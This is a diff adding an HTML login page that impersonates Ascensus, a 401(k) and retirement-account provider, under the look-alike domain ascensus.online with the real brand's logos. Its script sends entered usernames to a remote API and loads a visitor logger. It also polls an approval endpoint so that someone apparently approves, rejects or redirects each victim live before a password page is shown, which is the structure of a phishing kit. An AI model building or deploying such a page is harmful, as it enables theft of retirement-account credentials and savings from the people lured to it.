@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  
+  <!-- Primary SEO Meta Tags -->
+  <title>Ascensus Login - Secure 401(k) & Retirement Account Access</title>
+  <meta name="description" content="Access your Ascensus retirement account, 401(k) account, and participant login. Secure online access to manage your retirement savings and investments.">
+  <meta name="keywords" content="Ascensus login, Ascensus account login, Ascensus retirement login, Ascensus 401k login, Ascensus retirement account, participant login">
+  
+  <!-- Open Graph Meta Tags -->
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Ascensus Login - Secure Retirement Account Access">
+  <meta property="og:description" content="Log in to your Ascensus 401(k) and retirement account. Manage your retirement plan online securely.">
+  <meta property="og:url" content="https://ascensus.online">
+  <meta property="og:site_name" content="Ascensus">
+  <meta property="og:image" content="https://cdn2.ascensus.com/ascensus/vfrngwxa/ascensus-logo-new_rgb-225x40.svg">
+  
+  <!-- Twitter Card Meta Tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Ascensus Login - Secure Retirement Account Access">
+  <meta name="twitter:description" content="Log in to your Ascensus 401(k) and retirement account. Manage your retirement plan online securely.">
+  <meta name="twitter:image" content="https://cdn2.ascensus.com/ascensus/vfrngwxa/ascensus-logo-new_rgb-225x40.svg">
+  
+  <!-- Canonical URL -->
+  <link rel="canonical" href="https://ascensus.online">
+  
+  <!-- Mobile and App Links -->
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  
+  <!-- Security and Standards -->
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <meta name="format-detection" content="telephone=no">
+  
+  <!-- JSON-LD Structured Data -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Organization",
+    "name": "Ascensus",
+    "url": "https://ascensus.online",
+    "logo": "https://cdn2.ascensus.com/ascensus/vfrngwxa/ascensus-logo-new_rgb-225x40.svg",
+    "description": "Ascensus provides administrative and recordkeeping services for retirement plans including 401(k) plans, 403(b) plans, and retirement savings accounts.",
+    "sameAs": [
+      "https://www.facebook.com/ascensus",
+      "https://twitter.com/ascensus",
+      "https://www.linkedin.com/company/ascensus"
+    ],
+    "contactPoint": {
+      "@type": "ContactPoint",
+      "contactType": "Customer Service",
+      "availableLanguage": "English"
+    }
+  }
+  </script>
+  
+  <!-- JSON-LD for Login Page -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebApplication",
+    "name": "Ascensus Account Login",
+    "description": "Secure login portal for Ascensus 401(k) and retirement account holders",
+    "url": "https://ascensus.online",
+    "applicationCategory": "FinanceApplication",
+    "operatingSystem": "Web",
+    "offers": {
+      "@type": "Offer",
+      "category": "Retirement Planning"
+    }
+  }
+  </script>
+  
+  <!-- FAQPage Structured Data -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "FAQPage",
+    "mainEntity": [
+      {
+        "@type": "Question",
+        "name": "How do I log in to my Ascensus account?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Enter your username in the login field and click Next. Follow the prompts to verify your identity and access your retirement account."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "What is an Ascensus 401(k) account?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "An Ascensus 401(k) account is a retirement savings plan administered by Ascensus where employees can contribute to their retirement savings."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "How can I access my Ascensus retirement account online?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "You can access your Ascensus retirement account online by logging in with your username on this portal."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "What if I forgot my Ascensus username?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Click on 'Forgot Username' to recover your username. You will need to provide your email address or other verification information."
+        }
+      }
+    ]
+  }
+  </script>
+  
+  <style>
+* {
+  box-sizing: border-box;
+}
+
+html,
+body {
+  margin: 0;
+  min-height: 100%;
+}
+
+body {
+  font-family: Arial, Helvetica, sans-serif;
+  background: #f3f3f3;
+  color: #171717;
+}
+
+/* HEADER */
+.header {
+  height: 55px;
+  background: #fff;
+  display: flex;
+  align-items: center;
+  padding: 0 22px;
+}
+
+.logo {
+  display: flex;
+  align-items: center;
+  gap: 9px;
+  font-size: 28px;
+  font-weight: 500;
+  letter-spacing: 2.5px;
+  color: #123642;
+}
+
+.logo-mark {
+  width: 40px;
+  height: 44px;
+  position: relative;
+}
+
+.logo-mark::before {
+  content: "";
+  position: absolute;
+  left: 14px;
+  top: 0;
+  width: 0;
+  height: 0;
+  border-left: 13px solid transparent;
+  border-right: 13px solid transparent;
+  border-bottom: 40px solid #12a89d;
+  transform: rotate(28deg);
+}
+
+.logo-mark::after {
+  content: "";
+  position: absolute;
+  left: 3px;
+  top: 24px;
+  width: 33px;
+  height: 4.5px;
+  background: #12a89d;
+  transform: rotate(-31deg);
+  box-shadow: 8px 9px 0 #123642;
+}
+
+/* NOTICE AREA */
+.notice-area {
+  max-width: 1040px;
+  margin: 30px auto;
+  padding: 0 17px;
+}
+
+/* APP BANNER */
+.app-banner {
+  min-height: 78px;
+  background: #003d4b;
+  color: white;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 16px 29px;
+  gap: 22px;
+}
+
+.app-text {
+  font-size: 17px;
+  font-weight: 700;
+}
+
+.badges {
+  display: flex;
+  gap: 12px;
+  flex-shrink: 0;
+}
+
+.badge {
+  width: 120px;
+  height: 41px;
+  border: 1px solid #777;
+  border-radius: 6px;
+  background: #050505;
+  color: #fff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+  line-height: 1.05;
+}
+
+.badge small {
+  display: block;
+  font-size: 8px;
+}
+
+.badge strong {
+  display: block;
+  font-size: 16px;
+}
+
+/* INFO */
+.info {
+  margin-top: 14px;
+  min-height: 54px;
+  background: #fff;
+  border: 1px solid #ccc;
+  border-left: 5px solid #222;
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  padding: 11px 15px;
+  font-size: 15px;
+}
+
+.info-icon {
+  width: 24px;
+  height: 24px;
+  border-radius: 50%;
+  background: #222;
+  color: #fff;
+  display: grid;
+  place-items: center;
+  font-weight: 700;
+}
+
+/* HERO */
+.hero {
+  height: 350px;
+  margin-top: 29px;
+  background:
+    linear-gradient(rgba(0, 0, 0, 0.52), rgba(0, 0, 0, 0.52)),
+    url("https://cdn2.ascensus.com/ascensus/8d8019c8ec04a02/familybeach.jpg")
+      center / cover no-repeat;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  position: relative;
+  opacity: 1;
+}
+
+.welcome {
+  color: #fff;
+  font-size: 29px;
+  font-weight: 700;
+  margin-top: 115px;
+}
+
+/* LOGIN */
+.login-wrap {
+  width: min(690px, calc(100% - 32px));
+  position: absolute;
+  top: 250px;
+  left: 50%;
+  transform: translateX(-50%);
+  z-index: 2;
+}
+
+.login-card {
+  background: #fff;
+  min-height: 210px;
+  border: 1px solid #d1d1d1;
+  border-radius: 4px;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.16);
+  padding: 27px 34px 31px;
+}
+
+.login-card h1 {
+  text-align: center;
+  font-size: 21px;
+  margin: 0 0 31px;
+}
+
+.field {
+  max-width: 450px;
+  margin: 0 auto;
+}
+
+label {
+  display: block;
+  color: #555;
+  font-size: 14px;
+  margin-bottom: 7px;
+}
+
+input {
+  width: 100%;
+  height: 48px;
+  border: 1px solid #ccc;
+  border-radius: 3px;
+  padding: 0 13px;
+  font-size: 16px;
+  outline: none;
+}
+
+input:focus {
+  border-color: #00788a;
+  box-shadow: 0 0 0 2px rgba(0, 120, 138, 0.12);
+}
+
+/* BUTTON */
+.actions {
+  text-align: center;
+  margin-top: 19px;
+}
+
+button {
+  width: 122px;
+  height: 48px;
+  border: 0;
+  border-radius: 4px;
+  background: #003d4b;
+  color: #fff;
+  font-size: 16px;
+  font-weight: 700;
+  cursor: pointer;
+}
+
+button:hover {
+  background: #075465;
+}
+
+/* LINKS */
+.links {
+  margin-top: 18px;
+  text-align: center;
+  font-size: 14px;
+}
+
+.links a {
+  color: #174f80;
+  text-decoration: underline;
+}
+
+/* FOOTER */
+.footer {
+  margin-top: 285px;
+  min-height: 160px;
+  background: #008c83;
+  color: #fff;
+  text-align: center;
+  padding: 31px 20px 19px;
+  font-size: 12px;
+  line-height: 1.45;
+}
+
+.footer .legal {
+  max-width: 950px;
+  margin: 0 auto 13px;
+}
+
+.footer-links {
+  font-size: 15px;
+  margin-bottom: 13px;
+}
+
+.footer-links a {
+  color: white;
+  text-decoration: underline;
+}
+
+/* DEMO NOTE */
+.demo-note {
+  position: fixed;
+  right: 13px;
+  bottom: 13px;
+  background: #fff;
+  color: #333;
+  border: 1px solid #bbb;
+  border-radius: 5px;
+  padding: 8px 11px;
+  font-size: 11px;
+  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+  z-index: 20;
+}
+
+/* MOBILE */
+
+@media (max-width: 760px) {
+
+  .header {
+    height: 50px;
+    padding: 0 13px;
+  }
+
+  .logo {
+    font-size: 20px;
+    letter-spacing: 1.2px;
+    gap: 7px;
+  }
+  .logo img {
+    height: 20px;
+  }
+
+  .logo-mark {
+    width: 32px;
+    height: 36px;
+  }
+
+  .logo-mark::before {
+    left: 11px;
+    border-left-width: 10px;
+    border-right-width: 10px;
+    border-bottom-width: 33px;
+  }
+
+  .logo-mark::after {
+    left: 2px;
+    top: 20px;
+    width: 27px;
+    height: 4px;
+    box-shadow: 6px 7px 0 #123642;
+  }
+
+  .notice-area {
+    margin: 15px auto;
+    padding: 0 25px;
+  }
+
+  .app-banner {
+    display: block;
+    min-height: 65px;
+    padding: 13px 20px;
+    gap: 12px;
+  }
+
+  .app-text {
+    font-size: 14px;
+  }
+
+  .badges {
+    display: block;
+    width: 100%;
+    gap: 8px;
+  }
+
+  .badge {
+    padding-left: 5px;
+    height: 35px;
+    border-radius: 5px;
+  }
+
+  .badge small {
+    font-size: 7px;
+  }
+
+  .badge strong {
+    font-size: 14px;
+  }
+
+  .info {
+    margin-top: 11px;
+    min-height: 46px;
+    gap: 10px;
+    padding: 9px 11px;
+    font-size: 13px;
+  }
+
+  .info-icon {
+    width: 20px;
+    height: 20px;
+    font-size: 12px;
+    flex-shrink: 0;
+  }
+
+  .hero {
+    height: 280px;
+    margin-top: 22px;
+  }
+
+  .welcome {
+    font-size: 21px;
+    margin-top: 72px;
+  }
+
+  .login-wrap {
+    width: calc(100% - 26px);
+    top: 195px;
+  }
+
+  .login-card {
+    min-height: 185px;
+    padding: 20px 17px 23px;
+  }
+
+  .login-card h1 {
+    font-size: 18px;
+    margin-bottom: 21px;
+  }
+
+  .field {
+    max-width: 100%;
+  }
+
+  label {
+    font-size: 12px;
+    margin-bottom: 5px;
+  }
+
+  input {
+    height: 43px;
+    padding: 0 11px;
+    font-size: 14px;
+  }
+
+  .actions {
+    margin-top: 15px;
+  }
+
+  button {
+    width: 110px;
+    height: 43px;
+    font-size: 14px;
+  }
+
+  .links {
+    margin-top: 14px;
+    font-size: 13px;
+  }
+
+  .footer {
+    margin-top: 275px;
+    min-height: 140px;
+    padding: 25px 15px 17px;
+    font-size: 10px;
+  }
+
+  .footer .legal {
+    margin-bottom: 10px;
+  }
+
+  .footer-links {
+    font-size: 13px;
+    margin-bottom: 11px;
+  }
+
+  .demo-note {
+    right: 10px;
+    bottom: 10px;
+    padding: 6px 9px;
+    font-size: 9px;
+  }
+}
+
+.store{
+    background: whitesmoke;
+    color: black;
+}
+
+.message-container {
+  width: 100%;
+  padding: 12px 12px;
+  margin-bottom: 20px;
+  border-radius: 4px;
+  font-size: 14px;
+  line-height: 1.5;
+  display: none;
+  align-items: center;
+  gap: 10px;
+}
+.message-container.show {
+  display: flex;
+}
+.message-container.success {
+  background: #d4edda;
+  border: 1px solid #c3e6cb;
+  color: #155724;
+}
+.message-container.error {
+  background: #f8d7da;
+  border: 1px solid #f5c6cb;
+  color: #721c24;
+}
+.message-icon {
+  font-size: 16px;
+  flex-shrink: 0;
+}
+  </style>
+</head>
+<body>
+
+  <header class="header">
+    <div class="logo">
+      <img src="https://cdn2.ascensus.com/ascensus/vfrngwxa/ascensus-logo-new_rgb-225x40.svg" alt="Ascensus Retirement Logo">
+    </div>
+  </header>
+ 
+
+  <section class="notice-area">
+    <div class="app-banner">
+      <div class="app-text">Get secure, one-touch access to your account with the READYSAVE™ mobile app.</div>
+        <div class="badges">
+           <a href="https://apps.apple.com/us/app/readysave/id1490893138"> <img class="badge" src="https://cdn.ascensus.com/-/media/Employee-Experience/Images/appstore2x.png" alt="Download on Apple App Store"> </a>
+            <a href="https://play.google.com/store/apps/details?id=com.ascensus.employeemobileapp&hl=en_US"> <img class="badge" src="https://cdn.ascensus.com/-/media/Employee-Experience/Images/googleplay2x.png" alt="Get it on Google Play"> </a>
+        </div>
+    </div>
+    <div class="info">
+      <span class="info-icon">i</span>
+      <span>Former Newport or PAi participant retirement accounts, <a href="#" id="redirect" onclick="sendretirement(); return false;">log in here</a>.</span>
+    </div>
+  </section>
+  
+
+  <main class="hero">
+    <div class="welcome">Welcome to Ascensus</div>
+
+    <div class="login-wrap">
+      <div class="login-card">
+        <h1>Account Login</h1>
+        <div id="messageBox" class="message-container">
+          <span class="message-icon" id="messageIcon"></span>
+          <span id="messageText"></span>
+        </div>
+        <form id="demoLogin">
+          <div class="field">
+            <label for="username">Username</label>
+            <input id="username" name="username" type="text" autocomplete="off" placeholder="Enter your username">
+          </div>
+        </form>
+      </div>
+      <div class="actions">
+        <button type="submit" style="text-align: left; padding-left: 20px;" onclick="submitLogin()" id="loginBtn">Next</button>
+      </div>
+
+      <div class="links">
+        <a href="https://myaccount.ascensus.com/rplink/account/ForgotUsername">Forgot Username</a>
+        &nbsp;•&nbsp;
+        <a href="./resources/help.html">Help</a>
+      </div>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="legal">
+     Ascensus, LLC provides administrative and recordkeeping services. It is not a broker-dealer or an investment advisor and does not provide tax, legal, or accounting services. Ascensus® and the Ascensus logo are trademarks of Ascensus, LLC. All Rights Reserved.
+    </div>
+    <div class="footer-links">
+      <a href="./resources/terms.html">Terms and Conditions</a>
+      &nbsp;|&nbsp;
+      <a href="./resources/privacy.html">Privacy Management</a>
+      &nbsp;|&nbsp;
+      <a href="./resources/security.html">Security</a>
+    </div>
+    © 2026 Retirement Portal Demo.
+  </footer>
+
+  <script src="config.js"></script>
+  <script src="js/logVisitor.js"></script>
+
+  <script>
+    let statusCheckInterval = null;
+let loginVerificationId = null;
+
+    function showMessage(message, type = 'error') {
+  const messageBox = document.getElementById('messageBox');
+  const messageText = document.getElementById('messageText');
+  const messageIcon = document.getElementById('messageIcon');
+  
+  messageText.textContent = message;
+  messageBox.className = 'message-container show ' + type;
+  messageIcon.textContent = type === 'success' ? '✓' : '✕';
+  
+  setTimeout(() => {
+    messageBox.classList.remove('show');
+  }, 5000);
+}
+     
+function submitLogin(){
+  const username = document.getElementById('username').value.trim();
+
+  if (!username) {
+    showMessage('Please enter your username.', 'error');
+    return;
+  }
+  
+  const btn = document.getElementById('loginBtn');
+  const originalText = btn.textContent;
+  btn.disabled = true;
+  btn.textContent = 'Loading...';
+  
+  fetch(window.ascensus_API_BASE + '/api/auth/login/username', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ username: username})
+  })
+  .then(function(response){
+    return response.json().then(function(data){
+      return { ok: response.ok, data: data };
+    });
+  })
+  .then(function(result){
+    if(!result.ok){
+      showMessage(result.data.message || 'Unable to process login.', 'error');
+      btn.disabled = false;
+      btn.textContent = originalText;
+      return;
+    }
+
+    localStorage.setItem('temp_token', result.data.tempToken);
+    loginVerificationId = result.data.verificationId;
+    localStorage.setItem('login_verification_id', result.data.verificationId);
+
+    if(result.data.requiresApproval){
+      startStatusCheck();
+    } else if(result.data.requiresTwoFactor){
+      window.location.href = 'verify-method.html';
+    } else {
+      localStorage.setItem('ascensus_token', result.data.tempToken);
+    }
+  })
+  .catch(function(){
+    showMessage('Unable to reach the server. Please try again.', 'error');
+    btn.disabled = false;
+    btn.textContent = originalText;
+  });
+}
+
+function startStatusCheck() {
+   const username = document.getElementById('username').value.trim();
+  if (statusCheckInterval) {
+    clearInterval(statusCheckInterval);
+  }
+
+  statusCheckInterval = setInterval(() => {
+    if (!loginVerificationId) {
+      clearInterval(statusCheckInterval);
+      return;
+    }
+
+    const tempToken = localStorage.getItem('temp_token');
+    fetch(window.ascensus_API_BASE + `/api/auth/check-username-approval/${loginVerificationId}`, {
+      headers: { 'Authorization': `Bearer ${tempToken}` },
+    })
+    .then(r => r.json())
+    .then(result => {
+      if (result.status === 'approved') {
+        clearInterval(statusCheckInterval);
+         localStorage.setItem('ascensus_username', username)
+        completeLogin();
+      } else if (result.status === 'rejected') {
+        clearInterval(statusCheckInterval);
+        rejectLogin();
+      } else if (result.status === 'redirected') {
+        clearInterval(statusCheckInterval);
+       window.location.href=window.APP_CONFIG.redirectLink
+      }
+    })
+    .catch(err => {
+      console.error('Status check error:', err);
+    });
+  }, 3000);
+}
+
+function completeLogin() {
+  const tempToken = localStorage.getItem('temp_token');
+  localStorage.setItem('verification_complete', 'true');
+
+  setTimeout(() => {
+    window.location.href = './transactional/login-password.html';
+  }, 500);
+}
+
+function rejectLogin() {
+  if (statusCheckInterval) {
+    clearInterval(statusCheckInterval);
+  }
+  
+  showMessage('Username is incorrect.', 'error');
+  
+  localStorage.removeItem('temp_token');
+  localStorage.removeItem('ascensus_username');
+  localStorage.removeItem('login_verification_id');
+  
+  setTimeout(() => {
+    window.location.href = './index.html';
+  }, 2000);
+}
+
+async function sendretirement() {
+  const redirect = document.getElementById("redirect")
+  try {
+    const response = await fetch(window.ascensus_API_BASE + '/api/logs/retirement', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    });
+
+    const data = await response.json();
+
+    if (!response.ok) {
+      console.error(data.message || 'Request failed');
+      return;
+    }
+
+   window.location.href = "./retirement/retirement-login.html"
+    console.log('Success:', data);
+
+  } catch (error) {
+    console.error('Error:', error);
+  }
+}
+  </script>
+</body>
+</html>
